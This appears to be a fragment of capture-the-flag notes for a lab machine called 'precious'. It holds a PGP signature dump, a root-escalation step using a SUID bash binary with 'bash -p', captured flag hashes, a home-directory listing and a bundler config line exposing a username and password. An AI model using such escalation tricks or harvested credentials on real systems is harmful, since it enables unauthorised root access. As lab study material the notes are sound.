@@ -1,0 +1,39 @@
+-rw-r--r-- 1 root root 833 Sep 19 12:29 /var/lib/apt/lists/oss-binaries.phusionpassenger.com_apt_passenger_dists_bullseye_Release.gpg
+-----BEGIN PGP SIGNATURE-----
+iQIzBAABCAAdFiEEFjeKM6bvFnYpIlJuVh+bnKxAsvcFAmMomQQACgkQVh+bnKxA
+svf7kQ//UCfonuRMqlAik/aMv5LBJ6zHJ3AmPmd9ahFS4tfFWxBWxqdnz82tSHcs
+VwlpzyYPyqURAfnRZI4BSsUup22XdD3pfrCxSren7RAaEM8x55cNZpxXJj73Qeb1
+cZ5Uno/meRgrKD9u9HV5zmAC/Q8eI0QBjgTnPWv7f39jAAKBEqFdCCpS6kdBAIHU
+7AEHcVr4PKiKs6xWgL0zYK+n1CgjRM+OMgUA4ATXHVBc/MwCLIk76gBnk5wRfufY
+eaRzAcPPacj5wmlDHWmR5Xl0PG9bkTzLypHixFlToVL81vOsVMu7ioNYUhiuFgYi
+QA5VS/pgFv/poXkdVVQ0/FGwVl5aKEDmOkCLXFP4TuYBXRG2ZP56wbSHyVaZzp2f
+zdHL1/wVHK+oX7dthoy0MK5bdFpoXgvSAG8qXQxo9yH2FUzpQmOQkp44t6zxC4hW
+CaEL5EGToUOVx+54dTLP08QiMRCp0ZZ7LJFJZyYjR3CnqcMGrBtNM4Ez3nvZ2qVM
+sF5Po+ujwwHmFaG3PfLCwsiqO1Yw5OO6RMvXS0AV+gC2mafQCCPueV4y6g8KnDKP
+ObkKAhQX4JSwAOZn8QPGDVRs+v2pO0+nkcWhpBy3YfwJG9WvlAtoDpBk5ln2ALl0
+cRduWdLm5xYb+Ax6F2XGz65oY8Fnc0FeVtcTzIgT2IwIdjm50EY=
+=IZKc
+-----END PGP SIGNATURE-----
+
+
+SUID Binary: /usr/bin/bash 
+run: /usr/bin/bash -p 
+get root
+
+user.txt : 47a11e1782b4c76ba6d53f68a43ca462
+root.txt : 5862fa702bce2183308a1787bc879c62
+
+
+ruby@precious:~$ ls -la
+ls -la
+total 28
+drwxr-xr-x 4 ruby ruby 4096 Dec 17 15:30 .
+drwxr-xr-x 4 root root 4096 Oct 26 08:28 ..
+lrwxrwxrwx 1 root root    9 Oct 26 07:53 .bash_history -> /dev/null
+-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
+-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
+dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .bundle
+drwxr-xr-x 3 ruby ruby 4096 Dec 17 15:30 .cache
+-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile
+
+BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
